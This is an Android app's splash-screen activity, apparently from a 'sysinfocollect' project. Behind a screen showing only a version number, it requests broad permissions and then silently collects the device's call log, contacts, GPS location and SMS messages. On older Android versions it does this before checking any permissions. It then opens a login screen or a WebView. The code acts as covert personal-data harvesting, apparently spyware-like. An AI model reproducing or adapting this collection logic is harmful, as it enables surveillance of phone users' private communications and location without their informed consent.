package com.tutu.sysinfocollect.activity;

import android.Manifest;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.support.v4.content.PermissionChecker;
import android.text.TextUtils;
import android.widget.TextView;

import com.tbruyelle.rxpermissions2.RxPermissions;
import com.tutu.sysinfocollect.R;
import com.tutu.sysinfocollect.app.App;
import com.tutu.sysinfocollect.constans.Constans;
import com.tutu.sysinfocollect.module.callRecoder.CallRecoderGetHelper;
import com.tutu.sysinfocollect.module.contact.ContactGetHelper;
import com.tutu.sysinfocollect.module.gps.GpsGetHelper;
import com.tutu.sysinfocollect.module.sms.SmsGetHelper;
import com.tutu.sysinfocollect.utils.SPUtils;
import com.tutu.sysinfocollect.utils.ToastUtils;
import com.tutu.sysinfocollect.utils.Utils;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Properties;

import io.reactivex.functions.Consumer;

public class FlashActivity extends BaseActivity {
    private TextView tv_version;
    RxPermissions rxPermissions;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tv_version = (TextView) findViewById(R.id.tv_version);

        tv_version.setText("版本号:" + Utils.getAppVersionName(this.getApplication(), getPackageName()));
        rxPermissions = new RxPermissions(this);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            rxPermissions.request(Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.WRITE_CALL_LOG,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_EXTERNAL_STORAGE)
                    .subscribe(new Consumer<Boolean>() {
                        @Override
                        public void accept(Boolean aBoolean) throws Exception {

                            if (aBoolean) {
                                tv_version.postDelayed(new Runnable() {
                                    @Override
                                    public void run() {

                                        if (FlashActivity.getSystem().equals(SYS_MIUI)) {
                                            new CallRecoderGetHelper().getCallsListFromDb(App.app);
                                            new ContactGetHelper().getContacts(App.app);
                                            GpsGetHelper.getGps();
                                            new SmsGetHelper(App.app).getSmsInfos();
                                        }

                                        checkToken();
                                    }
                                }, 3000);
                            } else {
                                ToastUtils.showShortToast("没有获取到需要的权限");
                                finish();
                            }
                        }
                    });
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {

            new CallRecoderGetHelper().getCallsListFromDb(this);
            new ContactGetHelper().getContacts(this);
            GpsGetHelper.getGps();
            new SmsGetHelper(this).getSmsInfos();

            int p1 = PermissionChecker.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE);
            int p2 = PermissionChecker.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_SMS);
            int p3 = PermissionChecker.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION);
            int p4 = PermissionChecker.checkSelfPermission(getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION);
            int p5 = PermissionChecker.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_CONTACTS);
            int p6 = PermissionChecker.checkSelfPermission(getApplicationContext(), Manifest.permission.WRITE_EXTERNAL_STORAGE);
            int p7 = PermissionChecker.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_EXTERNAL_STORAGE);


            if (p1 == PermissionChecker.PERMISSION_GRANTED
                    && p2 == PermissionChecker.PERMISSION_GRANTED
                    && p3 == PermissionChecker.PERMISSION_GRANTED
                    && p4 == PermissionChecker.PERMISSION_GRANTED
                    && p5 == PermissionChecker.PERMISSION_GRANTED
                    && p6 == PermissionChecker.PERMISSION_GRANTED
                    && p7 == PermissionChecker.PERMISSION_GRANTED) {
                tv_version.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        checkToken();
                    }
                }, 3000);
            } else {
                ToastUtils.showShortToast("没有获取到需要的权限");
                finish();
            }
        }


    }

    private void checkToken() {
        if (TextUtils.isEmpty(SPUtils.getString(Constans.TOKEN))) {
            toLogin();
        } else {
            toWeb();
        }
    }

    private void toLogin() {
        Intent intent = new Intent(FlashActivity.this, LoginActivity.class);
        startActivity(intent);
        finish();
    }

    private void toWeb() {
        Intent intent = new Intent(FlashActivity.this, JsBridgeWebViewActivity.class);
        startActivity(intent);
        finish();
    }


    public static final String SYS_EMUI = "sys_emui";
    public static final String SYS_MIUI = "sys_miui";
    public static final String SYS_FLYME = "sys_flyme";
    private static final String KEY_MIUI_VERSION_CODE = "ro.miui.ui.version.code";
    private static final String KEY_MIUI_VERSION_NAME = "ro.miui.ui.version.name";
    private static final String KEY_MIUI_INTERNAL_STORAGE = "ro.miui.internal.storage";
    private static final String KEY_EMUI_API_LEVEL = "ro.build.hw_emui_api_level";
    private static final String KEY_EMUI_VERSION = "ro.build.version.emui";
    private static final String KEY_EMUI_CONFIG_HW_SYS_VERSION = "ro.confg.hw_systemversion";

    public static String getSystem() {
        String SYS = "";
        try {
            Properties prop = new Properties();
            prop.load(new FileInputStream(new File(Environment.getRootDirectory(), "build.prop")));
            if (prop.getProperty(KEY_MIUI_VERSION_CODE, null) != null
                    || prop.getProperty(KEY_MIUI_VERSION_NAME, null) != null
                    || prop.getProperty(KEY_MIUI_INTERNAL_STORAGE, null) != null) {
                SYS = SYS_MIUI;//小米
            } else if (prop.getProperty(KEY_EMUI_API_LEVEL, null) != null
                    || prop.getProperty(KEY_EMUI_VERSION, null) != null
                    || prop.getProperty(KEY_EMUI_CONFIG_HW_SYS_VERSION, null) != null) {
                SYS = SYS_EMUI;//华为
            } else if (getMeizuFlymeOSFlag().toLowerCase().contains("flyme")) {
                SYS = SYS_FLYME;//魅族
            }
            ;
        } catch (IOException e) {
            e.printStackTrace();
            return SYS;
        }
        return SYS;
    }

    public static String getMeizuFlymeOSFlag() {
        return getSystemProperty("ro.build.display.id", "");
    }

    private static String getSystemProperty(String key, String defaultValue) {
        try {
            Class<?> clz = Class.forName("android.os.SystemProperties");
            Method get = clz.getMethod("get", String.class, String.class);
            return (String) get.invoke(clz, key, defaultValue);
        } catch (Exception e) {
        }
        return defaultValue;
    }
}
